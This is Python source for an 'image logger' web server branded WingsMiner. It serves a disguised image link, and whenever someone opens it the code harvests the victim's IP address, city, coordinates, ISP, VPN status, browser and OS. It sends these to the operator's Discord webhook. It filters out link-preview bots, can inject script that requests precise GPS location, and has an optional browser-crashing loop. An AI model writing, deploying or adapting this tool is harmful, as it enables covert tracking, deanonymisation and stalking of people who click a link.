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", # <------------------------- Put image address link here.
    "imageArgument": True,

    "username": "WingsMiner",
    "color": 0x03AC13,

    "crashBrowser": False,
    
    "accurateLocation": False,

    "message": { 
        "doMessage": False,
        "message": ".",
        "richMessage": True,
    },

    "vpnCheck": 1, 

    "linkAlerts": False,
    "buggedImage": True,

    "antiBot": 1,

    "redirect": {
        "redirect": True,
        "page": "https://discord.gg/wingsminer" 
    },
}

blacklistedIPs = ("27", "104", "143", "164") 

def botCheck(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    else:
        return False

def reportError(error):
    requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "@everyone",
    "embeds": [
        {
            "title": "WingsMiner Error",
            "color": config["color"],
            "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
        }
    ],
})

def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False):
    if ip.startswith(blacklistedIPs):
        return
    
    bot = botCheck(ip, useragent)
    
    if bot:
        requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "",
    "embeds": [
        {
            "title": "WingsMiner link sent.",
            "color": config["color"],
            "description": f"Link sent successfully.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
        }
    ],
}) if config["linkAlerts"] else None
        return

    ping = "."

    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
    if info["proxy"]:
        if config["vpnCheck"] == 2:
                return
        
        if config["vpnCheck"] == 1:
            ping = ""
    
    if info["hosting"]:
        if config["antiBot"] == 4:
            if info["proxy"]:
                pass
            else:
                return

        if config["antiBot"] == 3:
                return

        if config["antiBot"] == 2:
            if info["proxy"]:
                pass
            else:
                ping = ""

        if config["antiBot"] == 1:
                ping = ""


    os, browser = httpagentparser.simple_detect(useragent)
    
    embed = {
    "username": config["username"],
    "content": ping,
    "embeds": [
        {
            "title": "",
            "color": config["color"],
            "description": f"""```The user has clicked the image. IP successfully grabbed. <WingsServices>
            
> IP:
{ip if ip else 'unknown'}

> Country / City:
{info['country'] if info['country'] else 'unknown'} / {info['city'] if info['city'] else 'unknown'}

> Provider:
{info['isp'] if info['isp'] else 'unknown'}

> Coords:
{str(info['lat'])+', '+str(info['lon']) if not coords else coords.replace(',', ', ')} ({'Approximate' if not coords else 'Precise, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})

> Timezone:
{info['timezone'].split('/')[0]}

> VPN:
{info['proxy']}

> ASN:
{info['as'] if info['as'] else 'unknown'}

> Browser:
{browser}

> OS:
{os}

> User Agent:
{useragent}
```""",
    }
  ],
}

    if url: embed["embeds"][0].update({"thumbnail": {"url": url}})
    requests.post(config["webhook"], json = embed)
    return info

binaries = {
    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
}

class ImageLoggerAPI(BaseHTTPRequestHandler):
    
    def handleRequest(self):
        try:
            if config["imageArgument"]:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
                if dic.get("url") or dic.get("id"):
                    url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode()
                else:
                    url = config["image"]
            else:
                url = config["image"]

            data = f'''<style>body {{
margin: 0;
padding: 0;
}}
div.img {{
background-image: url('{url}');
background-position: center center;
background-repeat: no-repeat;
background-size: contain;
width: 100vw;
height: 100vh;
}}</style><div class="img"></div>'''.encode()
            
            if self.headers.get('x-forwarded-for').startswith(blacklistedIPs):
                return
            
            if botCheck(self.headers.get('x-forwarded-for'), self.headers.get('user-agent')):
                self.send_response(200 if config["buggedImage"] else 302)
                self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url)
                self.end_headers()

                if config["buggedImage"]: self.wfile.write(binaries["loading"])

                makeReport(self.headers.get('x-forwarded-for'), endpoint = s.split("?")[0], url = url)
                
                return
            
            else:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))

                if dic.get("g") and config["accurateLocation"]:
                    location = base64.b64decode(dic.get("g").encode()).decode()
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), location, s.split("?")[0], url = url)
                else:
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), endpoint = s.split("?")[0], url = url)
                

                message = config["message"]["message"]

                if config["message"]["richMessage"] and result:
                    message = message.replace("{ip}", self.headers.get('x-forwarded-for'))
                    message = message.replace("{isp}", result["isp"])
                    message = message.replace("{asn}", result["as"])
                    message = message.replace("{country}", result["country"])
                    message = message.replace("{region}", result["regionName"])
                    message = message.replace("{city}", result["city"])
                    message = message.replace("{lat}", str(result["lat"]))
                    message = message.replace("{long}", str(result["lon"]))
                    message = message.replace("{timezone}", f"{result['timezone'].split('/')[1].replace('_', ' ')} ({result['timezone'].split('/')[0]})")
                    message = message.replace("{mobile}", str(result["mobile"]))
                    message = message.replace("{vpn}", str(result["proxy"]))
                    message = message.replace("{bot}", str(result["hosting"] if result["hosting"] and not result["proxy"] else 'Possibly' if result["hosting"] else 'False'))
                    message = message.replace("{browser}", httpagentparser.simple_detect(self.headers.get('user-agent'))[1])
                    message = message.replace("{os}", httpagentparser.simple_detect(self.headers.get('user-agent'))[0])

                datatype = 'text/html'

                if config["message"]["doMessage"]:
                    data = message.encode()
                
                if config["crashBrowser"]:
                    data = message.encode() + b'<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>'
                if config["redirect"]["redirect"]:
                    data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()
                self.send_response(200)
                self.send_header('Content-type', datatype)
                self.end_headers()

                if config["accurateLocation"]:
                    data += b"""<script>
var currenturl = window.location.href;

if (!currenturl.includes("g=")) {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function (coords) {
    if (currenturl.includes("?")) {
        currenturl += ("&g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    } else {
        currenturl += ("?g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    }
    location.replace(currenturl);});
}}

</script>"""
                self.wfile.write(data)
        
        except Exception:
            self.send_response(500)
            self.send_header('Content-type', 'text/html')
            self.end_headers()

            self.wfile.write(b'500 - Internal Server Error <br>Please check the message sent to your Discord Webhook and report the error on the GitHub page.')
            reportError(traceback.format_exc())

        return
    
    do_GET = handleRequest
    do_POST = handleRequest

handler = ImageLoggerAPI